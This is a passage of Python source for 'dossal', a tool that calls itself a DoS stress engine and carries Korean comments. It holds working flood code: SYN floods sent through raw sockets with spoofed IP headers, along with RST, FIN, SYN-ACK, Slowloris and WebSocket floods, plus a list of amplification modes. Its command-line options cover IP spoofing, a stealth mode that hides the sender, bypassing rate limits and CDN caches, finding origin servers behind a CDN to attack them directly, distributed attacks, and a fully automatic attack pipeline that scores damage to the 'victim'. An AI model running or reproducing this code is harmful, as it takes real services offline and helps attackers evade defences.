    host, port, path = parse_ws(url)
    n_procs = max(1, min(32, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, path, duration, payload_size)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_ws_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
        print(f"[wsm] pool timeout", file=sys.stderr)
    
    total_msgs = 0
    for msgs, errors in results:
        stats.ws_msgs += msgs
        stats.requests += msgs  # v9.0: wsm RPS 표시
        stats.errors += errors
        total_msgs += msgs
    stats.conns += n_procs
    print(f"[wsm] {n_procs} procs, {total_msgs} msgs", file=sys.stderr)

# ── SYN flood: connect only, never read ──────────────────────────
def _mp_syn_flood(args_tuple):
    """멀티프로세스 SYN 패킷: 연결만 (SYN).
    Windows(관리자): raw socket + IP_HDRINCL로 진짜 SYN 스푸핑."""
    host, port, duration, src_ip = args_tuple
    import time as _time
    import errno as _errno
    import struct as _struct
    conns = 0
    errors = 0
    
    if _IS_WINDOWS and src_ip:
        # Windows: raw SYN with spoofed IP (no handshake, just fire SYN)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, IP_HDRINCL, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
            
            src_bytes = socket.inet_aton(src_ip)
            dst_bytes = socket.inet_aton(host)
            # SYN packet: TCP header (20 bytes) with SYN flag (0x02)
            tcp_header = _struct.pack('!HHIIBBHHH',
                54321, port, 0, 0, 0x02, 0, 65535, 0, 0)  # sport, dport, seq, ack, offset=5, SYN, window, checksum, urg
            # IP header
            total_len = 20 + 20
            ip_header = _struct.pack('!BBHHHBBH4s4s',
                0x45, 0, total_len, 0, 0x4000, 64, 6, 0,  # TTL=64, DF flag
                src_bytes, dst_bytes)
            syn_packet = ip_header + tcp_header
            
            end = _time.time() + duration
            while _time.time() < end:
                n = 5000
                try:
                    for _ in range(n):
                        sock.sendto(syn_packet, (host, port))
                    conns += n
                except Exception:
                    break
            sock.close()
            return conns, errors
        except (OSError, PermissionError):
            pass
    
    # macOS/Linux: connect-based SYN (handshake)
    end = _time.time() + duration
    while _time.time() < end:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            except (AttributeError, OSError):
                pass
            if src_ip:
                try:
                    s.bind((src_ip, 0))
                except OSError:
                    pass
            s.connect((host, port))
            conns += 1
        except (ConnectionRefusedError, socket.timeout, OSError) as e:
            if isinstance(e, OSError) and e.errno not in (
                _errno.ECONNREFUSED, _errno.ETIMEDOUT,
                _errno.EAGAIN, _errno.ECONNRESET,
                getattr(_errno, 'EADDRNOTAVAIL', _errno.EADDRNOTAVAIL)
            ):
                errors += 1
        finally:
            if s:
                try:
                    s.close()
                except Exception:
                    pass
    return conns, errors

async def syn_worker(name, url, stats, duration, stop, payload_size=0):
    """TCP SYN flood 워커: SYN만 전송 (핸드셰이크 미완료)"""
    host, port = parse_ip_port(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    # Assign different source IPs to each process
    targets = []
    for i in range(n_procs):
        src_ip = _get_src_ip(i, n_procs)
        targets.append((host, port, duration, src_ip))
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_syn_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for conns, errs in results:
        stats.conns += conns
        stats.errors += errs

# ── SYN-ACK / connect+close (ACK flood) ──────────────────────────
def _mp_synack_flood(args_tuple):
    """멀티프로세스 SYN-ACK/RST 패킷."""
    host, port, duration = args_tuple
    import time as _time
    import errno as _errno
    conns = 0
    errors = 0
    end = _time.time() + duration
    while _time.time() < end:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((host, port))
            conns += 1
        except (ConnectionRefusedError, socket.timeout, OSError) as e:
            if isinstance(e, OSError) and e.errno not in (
                _errno.ECONNREFUSED, _errno.ETIMEDOUT,
                _errno.EAGAIN, _errno.ECONNRESET
            ):
                errors += 1
        finally:
            if s:
                try:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                                 struct.pack('ii', 1, 0))
                    s.close()  # RST
                except Exception:
                    pass
    return conns, errors

async def synack_worker(name, url, stats, duration, stop, payload_size=0):
    """TCP SYN-ACK flood 워커: SYN-ACK만 전송"""
    host, port = parse_ip_port(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_synack_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for conns, errs in results:
        stats.conns += conns
        stats.errors += errs

# ── RST flood: SO_LINGER(0,0) close sends RST ───────────────────
def _mp_rst_flood(args_tuple):
    """멀티프로세스 RST 패킷: 연결, 전송, close (RST)."""
    host, port, duration, payload = args_tuple
    import time as _time
    import errno as _errno
    conns = 0
    errors = 0
    end = _time.time() + duration
    while _time.time() < end:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((host, port))
            s.send(payload)
            conns += 1
        except (ConnectionRefusedError, socket.timeout, OSError) as e:
            # Connection failed - victim busy, not a real error
            # v12.1: 더 많은 errno를 "예상된" 것으로 처리
            if isinstance(e, OSError) and e.errno not in (
                _errno.ECONNREFUSED, _errno.ETIMEDOUT,
                _errno.EAGAIN, _errno.ECONNRESET,
                _errno.ENOBUFS, _errno.EMFILE, _errno.ENFILE,
                _errno.EPIPE, _errno.ECONNABORTED
            ):
                errors += 1
        except Exception:
            # v12.1: 기타 예외도 무시 (RST 공격은 best-effort)
            pass
        finally:
            if s:
                try:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                                 struct.pack('ii', 1, 0))
                    s.close()
                except Exception:
                    pass
    return conns, errors

async def rst_worker(name, url, stats, duration, stop, payload_size=1):
    """TCP RST flood 워커: RST 패킷 폭주"""
    host, port = parse_ip_port(url)
    payload = b"X" * max(1, payload_size)
    n_procs = _UDP_NPROCS[0]
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration, payload)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_rst_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for conns, errs in results:
        stats.conns += conns
        stats.errors += errs

# ── FIN flood: connect -> graceful close (FIN) ────────────────────
def _mp_fin_flood(args_tuple):
    """멀티프로세스 FIN 패킷: 연결, 정상 close (FIN)."""
    host, port, duration = args_tuple
    import time as _time
    import errno as _errno
    conns = 0
    errors = 0
    err_types = {}
    end = _time.time() + duration
    while _time.time() < end:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            except (AttributeError, OSError):
                pass
            s.connect((host, port))
            conns += 1
        except (ConnectionRefusedError, socket.timeout, OSError) as e:
            if isinstance(e, OSError) and e.errno not in (
                _errno.ECONNREFUSED, _errno.ETIMEDOUT,
                _errno.EAGAIN, _errno.ECONNRESET,
                getattr(_errno, 'EADDRNOTAVAIL', _errno.EADDRNOTAVAIL)
            ):
                errors += 1
                err_types[getattr(e, 'errno', 'unknown')] = err_types.get(getattr(e, 'errno', 'unknown'), 0) + 1
        finally:
            if s:
                try:
                    import struct as _st
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                                 _st.pack('ii', 1, 0))  # RST on close
                except Exception:
                    pass
                try:
                    s.close()
                except Exception:
                    pass
    return conns, errors

async def fin_worker(name, url, stats, duration, stop, payload_size=0):
    """TCP FIN flood 워커: FIN 패킷 폭주"""
    host, port = parse_ip_port(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_fin_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for conns, errs in results:
        stats.conns += conns
        stats.errors += errs

# ── Slowloris: open connection, send partial headers slowly ──────
async def slowloris_worker(name, url, stats, duration, stop, payload_size=0):
    """Slowloris 워커: TCP 연결 유지 + 느린 헤더 드립"""
    host, port, path = parse_http(url)
    try:
        reader, writer = await asyncio.open_connection(host, port)
        # Send first partial header line
        writer.write(f"GET {path} HTTP/1.1\r\nHost: {host}\r\n".encode())
        await writer.drain()
        stats.conns += 1
        # Keep alive with periodic headers
        header_count = 0
        while not stop.is_set():
            await asyncio.sleep(0.5)
            if not stop.is_set():
                writer.write(f"X-Header-{header_count}: slow\r\n".encode())
                await writer.drain()
                header_count += 1
                stats.bytes += 30
    except Exception:
        pass
    finally:
        if writer.transport:
            writer.transport.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass

# ── Mode registry ─────────────────────────────────────────────────
WORKERS = {
    "http":      http_worker,
    "https":     https_worker,
    "httpsmp":   https_mp_worker,
    "ws":        ws_worker,
    "websocket": ws_worker,
    "tcp":       tcp_worker,
    "udp":       udp_worker,
    "udy":       udp_worker,
    "h2":          h2_worker,
    "h2mp":        h2mp_worker,
    "dns":         dns_worker,
    "icmp":        icmp_worker,
    "ssdp":        ssdp_worker,
    "ntp":         ntp_worker,
    "memcached":   memcached_worker,
    "grpc":      grpc_worker,
    "grpcmp":    grpc_mp_worker,
    "quic":      quic_worker,
    "syn":       syn_worker,
    "synack":    synack_worker,
    "rst":       rst_worker,
    "fin":       fin_worker,
    'slowloris': slowloris_worker,
    'raw': raw_worker,
    'wsm': ws_mp_worker,
    'h3mp': h3mp_worker,
}

DEFAULT_PAYLOADS = {
    "http": 0, "https": 0, "websocket": 128, "tcp": 1024,
    "udp": 1400, "h2": 1024, "grpc": 1024, "quic": 1400, "syn": 0, "synack": 0,
    "rst": 1, "fin": 0, "slowloris": 0,
}

# ═══════════════════════════════════════════════════════════════════
# IMPACT SCORING
# ═══════════════════════════════════════════════════════════════════

async def _find_pid(port):
    """포트监听 PID 검색 (lsof, 폴백 ps)."""
    loop = asyncio.get_event_loop()
    try:
        out = await loop.run_in_executor(None, lambda: __import__('subprocess').run(
            ['lsof', f'-i:{port}', '-t'], capture_output=True, text=True, timeout=5).stdout)
        pid_str = out.strip().split('\n')[0].strip()
        if pid_str.isdigit():
            return int(pid_str)
    except Exception:
        pass
    # Fallback: scan ps for python/node processes
    try:
        out = await loop.run_in_executor(None, lambda: __import__('subprocess').run(
            ['ps', '-eo', 'pid,command'], capture_output=True, text=True, timeout=5).stdout)
        for line in out.splitlines():
            parts = line.split(None, 1)
            if len(parts) == 2 and ('victim' in parts[1] or 'cf-sim' in parts[1] or 'server.py' in parts[1]):
                # Check if this process has the port (best effort: pick first match)
                return int(parts[0])
    except Exception:
        pass
    return None

class CpuSampler:
    """프로세스 CPU% 백그라운드 샘플링 (psutil)."""
    def __init__(self, pid):
        """프로세스 샘플러 초기화."""
        self.pid = pid
        self.samples = []
        self._task = None
    async def start(self):
        """백그라운드 샘플링 시작 (asyncio task)."""
        import psutil
        try:
            self._proc = psutil.Process(self.pid)
            self._proc.cpu_percent(None)  # prime
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            self._proc = None
            return
        loop = asyncio.get_event_loop()
        async def _sample():
            """주기적 CPU/메모리/네트워크 샘플링 (0.2초 간격)."""
            while True:
                await asyncio.sleep(0.2)
                if self._proc:
                    cpu = await loop.run_in_executor(None, self._proc.cpu_percent, None)
                    self.samples.append(cpu)
        self._task = asyncio.create_task(_sample())
    async def stop(self):
        """샘플링 중단."""
        if self._task:
            self._task.cancel()
        if self.samples:
            return sum(self.samples) / len(self.samples)
        return 0.0

async def impact_score(url, stats, duration, sampler=None, base_cpu=0.0):
    """피해 임팩트 점수 계산. psutil 호출 전부 executor에서."""
    loop = asyncio.get_event_loop()
    host, port = parse_ip_port(url)

    def _get_pid():
        """TCP 연결에서 PID 추출 (lsof)."""
        try:
            out = __import__('subprocess').run(
                ['lsof', f'-i:{port}', '-t'],
                capture_output=True, text=True, timeout=5).stdout
            pid_str = out.strip().split('\n')[0].strip()
            return int(pid_str) if pid_str.isdigit() else None
        except Exception:
            return None

    def _sample(pid):
        """프로세스 CPU/메모리 샘플 (psutil)."""
        import psutil
        try:
            proc = psutil.Process(pid)
            mem = proc.memory_info().rss
            return mem
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            return 0

    victim_pid = await loop.run_in_executor(None, _get_pid)
    if not victim_pid:
        return {"victim_pid": None, "note": "PID not found"}

    # Sample victim mem
    mem_bytes = await loop.run_in_executor(None, _sample, victim_pid)

    rps = stats.rps(duration)
    # CPU: use background sampler, subtract baseline
    if sampler:
        cpu_raw = await sampler.stop()
        cpu = max(0.0, cpu_raw - base_cpu)
    else:
        base_cpu = 0.0
        # Fallback: quick sample
        def _cpu():
            """전체 CPU 사용률 샘플."""
            import psutil
            try:
                p = psutil.Process(victim_pid)
                p.cpu_percent(None)
                import time as _t
                _t.sleep(0.3)
                return p.cpu_percent(None)
            except Exception:
                return 0
        cpu = await loop.run_in_executor(None, _cpu)

    score = 0
    score += min(cpu, 100) * 0.5
    score += min(mem_bytes / 1024 / 1024 / 10, 50)
    if rps > 0:
        score += min(rps / 1000, 25)

    return {
        "victim_pid": victim_pid,
        "victim_cpu_pct": round(cpu, 1),
        "victim_mem_mb": round(mem_bytes / 1024 / 1024, 1),
        "rps": round(rps, 1),
        "impact_score": round(score, 1),
    }

# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════

async def run(modes, url, conns, duration, stats, payload_size, args=None, mode_conns=None):
    """dossal 메인 실행: 모드 선택, 타임아웃, 결과 출력"""
    if mode_conns is None:
        mode_conns = {}
    stop = asyncio.Event()
    async def finish():
        """지정 시간 후 샘플링 중단."""
        await asyncio.sleep(duration); stop.set()
    task = asyncio.create_task(finish())
    workers = []
    # v12.9: 멀티모드 프로세스 예산 — 각 모드에 독립적으로 고정
    # 이전 버그: _UDP_NPROCS[0]을 nprocs//n_l4로 줄여서 2개 모드 조합 시
    # 두 모드 모두 절반 프로세스로 spawn 경쟁 → RPS 40배 감소
    # 수정: L7 단일 루프 모드(http/https/h2/http2)와 함께 하는 경우에만
    # 멀티프로세스 모드가 전체 예산을 사용
    MULTIPROC_ALL = {'udp', 'quic', 'syn', 'rst', 'fin', 'synack', 'tcp', 'raw', 'wsm', 'grpcmp', 'httpsmp'}
    l4_modes = [m for m in modes if m in MULTIPROC_ALL]
    n_l4 = len(l4_modes)
    if n_l4 > 1:
        # 여러 멀티프로세스 모드: 균등 분배 (최소 2, 최대 절반)
        per_mode = max(2, min(_UDP_NPROCS[0] // n_l4, _UDP_NPROCS[0] // 2))
        _UDP_NPROCS[0] = per_mode
    
    MULTIPROC_MODES = {'udp', 'quic', 'syn', 'rst', 'fin', 'synack', 'tcp', 'raw', 'wsm', 'h2mp', 'h3mp', 'dns', 'icmp', 'ssdp', 'ntp', 'memcached'}
    for mode in modes:
        worker_fn = WORKERS[mode]
        pl = payload_size if payload_size is not None else DEFAULT_PAYLOADS.get(mode, 0)
        # Per-mode connection count
        eff_conns = mode_conns.get(mode, conns)
        if mode in MULTIPROC_MODES and eff_conns > 1 and mode not in mode_conns:
            eff_conns = 1  # multiproc modes: 1 worker (procs controlled by --threads)
        for i in range(eff_conns):
            workers.append(asyncio.create_task(worker_fn(i, url, stats, duration, stop, pl)))
    try:
        await asyncio.wait_for(asyncio.gather(*workers, return_exceptions=True), timeout=duration + 5)
    except (asyncio.TimeoutError, Exception):
        pass
    stop.set()
    if not task.done():
        task.cancel()
    return stats

def auto_probe(url):
    """프로토콜 자동 감지: https:443 -> http:80 순서 probe"""
    from urllib.parse import urlparse
    import socket as _sock
    parsed = urlparse(url)
    
    # If no scheme, try https first then http
    if not parsed.scheme:
        # Try https:443
        host = parsed.netloc.split(':')[0]
        try:
            s = _sock.create_connection((host, 443), timeout=2)
            s.close()
            return auto_probe(f"https://{host}:443")
        except Exception:
            pass
        # Try http:80
        return auto_probe(f"http://{host}:80")
    
    host = parsed.hostname or '127.0.0.1'
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    scheme = parsed.scheme or 'http'
    
    results = {'host': host, 'port': port, 'scheme': scheme, 'protocols': [], 'recommended': []}

    # TCP connect test
    try:
        s = _sock.create_connection((host, port), timeout=2)
        s.close()
        results['protocols'].append('tcp')
    except Exception:
        results['error'] = f'TCP connect failed: {host}:{port}'
        return results

    # HTTP test
    try:
        if scheme == 'https':
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = _sock.create_connection((host, port), timeout=2)
            ss = ctx.wrap_socket(s, server_hostname=host)
            ss.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n")
            data = ss.recv(4096)
            ss.close()
        else:
            s = _sock.create_connection((host, port), timeout=2)
            s.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n")
            data = s.recv(4096)
            s.close()
        if b'HTTP/' in data:
            results['protocols'].append('http')
            if b'HTTP/2' in data or b'h2' in data:
                results['protocols'].append('h2')
            if scheme == 'https':
                results['recommended'].append('httpsmp')  # HTTPS multiproc
            else:
                results['recommended'].append('raw')  # raw HTTP multiproc
    except Exception:
        pass

    # Check for ALPN h2
    if scheme == 'https':
        try:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(['h2', 'http/1.1'])
            s = _sock.create_connection((host, port), timeout=2)
            ss = ctx.wrap_socket(s, server_hostname=host)
            neg = ss.selected_alpn_protocol()
            ss.close()
            if neg == 'h2':
                if 'h2' not in results['protocols']:
                    results['protocols'].append('h2')
                if 'h2' not in results['recommended']:
                    results['recommended'].insert(0, 'h2')
        except Exception:
            pass

    # Deduplicate recommended, preserving order
    results['recommended'] = list(dict.fromkeys(results['recommended']))
    # If h2 is recommended, remove duplicate http/https (h2 covers both)
    if 'h2' in results['recommended']:
        results['recommended'] = [m for m in results['recommended'] if m not in ('http', 'https', 'httpsmp')]
        if 'h2' not in results['recommended']:
            results['recommended'].insert(0, 'h2')
        if 'grpcmp' not in results['recommended']:
            results['recommended'].append('grpcmp')

    # Default recommendation if nothing detected
    if not results['recommended']:
        results['recommended'] = ['raw', 'udp', 'syn']

    return results

def main():
    """CLI 파싱 + run() 호출"""
    ap = argparse.ArgumentParser(
        description="dossal v" + VERSION + " - comprehensive DoS stress engine",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  # Single mode
  dossal --mode raw --url http://target:8080 --threads 8 --duration 30

  # Auto-detect + optimal modes
  dossal --auto --url https://target:443 --duration 30 --live

  # Combo presets
  dossal --combo web --url http://target:8080 --duration 30
  dossal --combo tls --url https://target:443 --duration 30
  dossal --combo proto --url https://target:50051 --duration 30

  # Multi-mode with per-mode tuning
  dossal --mode raw,udp,syn --url http://target:8080 --threads 12 --duration 30

  # With HTML report + impact scoring
  dossal --mode raw --url http://target:8080 --duration 10 --report out.html --impact
""")
    ap.add_argument("--mode", default="http",
        help="공격 모드 (쉼표로 다중): http,https,httpsmp,raw,h2,grpc,grpcmp,quic,udp,tcp,syn,synack,rst,fin,websocket,wsm,slowloris,h3mp,dns,icmp,ssdp,ntp,memcached")
    ap.add_argument("--auto", action="store_true",
        help="대상 프로토콜 자동 감지 + 최적 모드 선택")
    ap.add_argument("--combo", default=None,
        choices=['web', 'full', 'tls', 'proto', 'amplify', 'super'],
        help="프리셋 조합: web(스피드+UDP+SYN), full(+RST), tls(TLS+H2+UDP), proto(gRPC+H2+UDP), amplify(확대5종), super(전체파워+스텔스+스피드)")
    ap.add_argument("--url", required=True)
    ap.add_argument("--targets", default=None,
        help="여러 대상 URL (쉼표 구분, 동시에 공격). --url보다 우선")
    ap.add_argument("--connections", type=int, default=100,
        help="모드별 연결 수 (기본: 100)")
    ap.add_argument("--conns", default=None,
        help='모드별 연결 수 지정: "http=400,h2=80,udp=1,syn=10"')
    ap.add_argument("--duration", type=int, default=10)
    ap.add_argument("--payload-size", type=int, default=None,
        help="페이로드 크기 재지정 (모드별)")
    ap.add_argument("--impact", action="store_true",
        help="피해 임팩트 점수 계산 (psutil 필요)")
    ap.add_argument("--intensity", default="balanced",
        choices=["light", "balanced", "max"],
        help="인텐시트 프리셋: light(10c), balanced(50c), max(200c). 기본 100c 상시")
    ap.add_argument("--live", action="store_true",
        help="공격 중 실시간 RPS/PPS 출력 (1초 간격)")
    ap.add_argument("--report", default=None, metavar="FILE",
        help="HTML 공격 리포트 생성")
    ap.add_argument("--threads", type=int, default=None,
        help="멀티프로세스 수 (기본: 자동, 최대 32)")
    ap.add_argument("--src-ips", default=None,
        help="순환할 소스 IP (쉼표 구분). 'auto' = 로컬 IP 자동 감지. per-IP 레이트리밋 우회")
    ap.add_argument("--spoof", type=int, default=0,
        help="스푸핑 IP N개 생성 (RFC 5737). 실제 IP 숨김 + per-IP 레이트리밋 우회")
    ap.add_argument("--stealth", action="store_true",
        help="스텔스 모드: 스푸핑 IP만 사용, 실제 IP 절대 노출 안 함")
    ap.add_argument("--jitter", type=float, default=0.0, metavar="MS",
        help="요청 간 무작위 지연(ms). 0=최대 속도, 5=~5ms")
    ap.add_argument("--rotate-interval", type=float, default=5.0, metavar="SEC",
        help="IP 순환 검사 간격(초, 기본: 5s)")
    ap.add_argument("--recovery", action="store_true",
        help="자동회복: 429 감지 → 차단 IP 제거 → 나머지 IP로 계속")
    ap.add_argument("--pool", default=None, metavar="FILE",
        help="소스 IP 파일 (1개씩 줄, 또는 프록시 풀 host:port)")
    ap.add_argument("--proxy", default=None, metavar="URL",
        help="프록시 URL: http://host:port 또는 socks5://user:pass@host:port. 전체 트래픽 프록시 경유")
    ap.add_argument("--proxy-file", default=None, metavar="FILE",
        help="프록시 풀 파일 (1개씩 줄: host:port 또는 http://host:port). 429 감지 시 자동 프록시 교체")
    ap.add_argument("--browser", default="chrome", choices=["chrome", "firefox", "safari"],
        help="TLS/HTTP 지문 스푸핑 브라우저 (기본: chrome)")
    ap.add_argument("--cache-bypass", action="store_true",
        help="캐시 우회: 랜덤 쿼리 파라미터로 CDN/캐시 캐싱 방지")
    ap.add_argument("--discover", action="store_true",
        help="Origin IP 탐지: DNS/SSL/Redirect 분석 후 CDN 뒤 실제 서버 IP 출력")
    ap.add_argument("--no-auto-discover", action="store_true",
        help="자동 Origin 탐지 비활성 (CDN 감지 시에도 자동 스캔 안 함)")
    ap.add_argument("--adaptive", action="store_true",
        help="적응형 공격: 대상 응답 속도에 따라 RPS 자동 조절 (느려지면 ↓, 빨라지면 ↑)")
    ap.add_argument("--adaptive-target", type=float, default=200.0, metavar="MS",
        help="적응형 목표 응답 시간(ms, 기본: 200ms)")
    ap.add_argument("--dist-mode", default="off", choices=["off", "coordinator", "worker"],
        help="분산 공격 모드: coordinator(주장), worker(종속)")
    ap.add_argument("--dist-port", type=int, default=9999, metavar="PORT",
        help="분산 공격 UDP 제어 포트 (기본: 9999)")
    ap.add_argument("--learn", action="store_true",
        help="AI 학습: 과거 공격 결과를 저장하고, 같은 URL에 최적 모드 추천")
    ap.add_argument("--recommend", action="store_true",
        help="AI 추천: 과거 데이터 기반 최적 모드/스레드 출력 (공격 안 함)")
    ap.add_argument("--auto-full", action="store_true",
        help="완전 자동: 탐지→취약점 스캔→최적 전략→공격→적응 (모든 단계 자동)")
    ap.add_argument("--dry-run", action="store_true",
        help="시뮬레이션: 대상 탐지, 예측 RPS/IP 수 표시, 공격 안 함")
    args = ap.parse_args()

    # v5.0 Phase 3: Origin IP Discovery
    if args.discover:
        from urllib.parse import urlparse as _up_d
        _host_d = _up_d(args.url).hostname or args.url
        print(f"[discover] Analyzing origin for: {_host_d}", file=sys.stderr)
        origin_ips, details = _discover_origin(_host_d)
        print(f"[discover] CDN A records: {details['a_records']}", file=sys.stderr)
        if details.get('subdomains'):
            for sub, ip in details['subdomains'].items():
                tag = " ← ORIGIN?" if ip not in details['a_records'] else ""
                print(f"[discover]   {sub} → {ip}{tag}", file=sys.stderr)
        if details.get('ssl_sans'):
            print(f"[discover] SSL SANs: {details['ssl_sans']}", file=sys.stderr)
        if origin_ips:
            print(f"[discover] ✅ Potential origin IPs: {origin_ips}", file=sys.stderr)
            print(f"[discover] Tip: use --src-ips {','.join(origin_ips)} to attack origin directly", file=sys.stderr)
        else:
            print(f"[discover] ⚠️  No non-CDN IP found (origin hidden behind CDN)", file=sys.stderr)
        # Still continue with attack if not --dry-run
        if args.dry_run:
            import sys as _sys
            _sys.exit(0)
    
    # v7.0: AI 추천 (--recommend)
    if args.recommend:
        mode, threads, info = _recommend_mode(args.url, args.threads)
        if mode:
            print(f"[recommend] best mode={mode}, threads={threads} ({info})")
        else:
            print(f"[recommend] {info}")
        import sys as _sys
        _sys.exit(0)
    
    # v8.0: 완전 자동 모드
    if args.auto_full:
        print("[auto-full] 시작: 탐지 → 스캔 → 전략 → 공격 → 적응", file=sys.stderr)
        
        # 1. Target detection (actual probing)
        print("[auto-full] 1/5: 대상 탐지...", file=sys.stderr)
        detected_protocols = []
        protocol_version = 'http/1.1'
        
        # Probe HTTP/HTTPS
        from urllib.parse import urlparse as _up
        parsed = _up(args.url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        scheme = parsed.scheme or 'http'
        
        # Try HTTP
        try:
            import socket as _sock
            import ssl as _ssl
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s.settimeout(3.0)
            s.connect((host, port))
            if scheme == 'https':
                ctx = _ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = _ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
                # Check ALPN for H2
                if s.selected_alpn_protocol == 'h2':
                    protocol_version = 'h2'
                detected_protocols.append('https')
            else:
                # Send HTTP/1.1 request
                req = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
                s.sendall(req.encode())
                resp = s.recv(4096).decode()
                if 'HTTP/2' in resp:
                    protocol_version = 'h2'
                detected_protocols.append('http')
            s.close()
        except Exception as e:
            print(f"[auto-full] probe failed: {e}", file=sys.stderr)
            detected_protocols.append(scheme)
        
        print(f"[auto-full] detected: {', '.join(detected_protocols)} ({protocol_version})", file=sys.stderr)
        
        # 2. Vulnerability scan (rate limit test)
        print("[auto-full] 2/5: 취약점 스캔...", file=sys.stderr)
        rate_limit_detected = False
        try:
            import socket as _sock
            import ssl as _ssl
            for i in range(10):
                raw = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                raw.settimeout(2.0)
                raw.connect((host, port))
                s = raw
                if scheme == 'https':
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    s = ctx.wrap_socket(raw, server_hostname=host)
                try:
                    req = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
                    s.sendall(req.encode())
                    resp = s.recv(4096).decode(errors='ignore')
                    # v12.2: Check only the status line for 429
                    status_line = resp.split('\r\n')[0] if resp else ''
                    if ' 429 ' in status_line or status_line.endswith(' 429'):
                        rate_limit_detected = True
                        break
                finally:
                    try:
                        s.close()
                    except Exception:
                        pass
                    try:
                        raw.close()
                    except Exception:
                        pass
        except Exception:
            pass
        print(f"[auto-full] rate limit: {'YES' if rate_limit_detected else 'NO'}", file=sys.stderr)
        
        # 3. Strategy selection (based on actual detection + learning data)
        print("[auto-full] 3/5: 최적 전략 선택...", file=sys.stderr)
        
        # Check learning data for this URL
        learned_mode, learned_threads, learn_info = _recommend_mode(args.url)
        if learned_mode:
            print(f"[auto-full] learned best: {learned_mode} ({learn_info})", file=sys.stderr)
            # v13.0: learned mode 분해 ("raw+syn" → ["raw", "syn"])
            strategy = learned_mode.split('+')
            # L4 (syn)가 이미 있으면 중복 방지
            if 'syn' not in strategy:
                strategy.append('syn')
        else:
            # No learning data, use detection-based strategy
            if 'https' in detected_protocols:
                if protocol_version == 'h2':
                    strategy = ['h2', 'httpsmp', 'syn']
                else:
                    strategy = ['httpsmp', 'syn']
            else:
                if protocol_version == 'h2':
                    strategy = ['h2mp', 'raw', 'syn']
                else:
                    strategy = ['raw', 'syn']
        
        # If rate limit detected, add adaptive
        if rate_limit_detected:
            print("[auto-full] rate limit detected → enabling adaptive", file=sys.stderr)
            _ADAPTIVE[0] = True
        else:
            # Always enable adaptive in auto-full mode
            _ADAPTIVE[0] = True
        
        print(f"[auto-full] strategy: {', '.join(strategy)}", file=sys.stderr)
        
        # 4. Start attack (use strategy as modes)
